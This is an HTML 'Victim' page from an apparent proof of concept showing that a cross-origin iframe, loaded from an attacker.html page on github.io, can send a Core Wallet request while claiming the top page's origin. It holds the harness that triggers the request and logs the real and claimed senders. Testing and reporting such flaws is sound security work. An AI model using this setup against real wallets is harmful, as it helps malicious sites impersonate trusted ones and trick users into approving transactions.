<!doctype html>
<meta charset="utf-8">
<title>Victim</title>

<h3>Victim Page</h3>

<p>Top-level Origin A:</p>
<pre id="a"></pre>

<p>
Cross-origin iframe B will request wallet access while claiming to be Origin A.
</p>

<button id="trigger">Trigger request from Origin B</button>

<pre id="log"></pre>

<iframe id="frame" style="width:100%;height:70px"></iframe>

<script>
const CHILD = 'https://azza1231.github.io/pocpoc/attacker.html';

const frame = document.getElementById('frame');
const log = document.getElementById('log');
const childOrigin = new URL(CHILD).origin;

document.getElementById('a').textContent = location.origin;

const child = new URL(CHILD);
child.searchParams.set('topOrigin', location.origin);
frame.src = child.href;

function print(x) {
  log.textContent += x + '\n';
}

addEventListener('message', event => {
  if (event.source !== frame.contentWindow) return;
  if (event.origin !== childOrigin) return;

  if (event.data === 'READY') {
    print('Browser-confirmed Origin B: ' + event.origin);
  }

  if (event.data === 'SENT') {
    print('');
    print('Wallet request sent by Origin B.');
    print('Actual sender : ' + event.origin);
    print('Claimed origin: ' + location.origin);
    print('');
    print('Check Core Wallet UI.');
    print('If it shows Origin A as the requester, origin attribution is bypassed.');
  }
});

document.getElementById('trigger').onclick = () => {
  frame.contentWindow.postMessage(
    'TRIGGER',
    childOrigin
  );
};
</script>
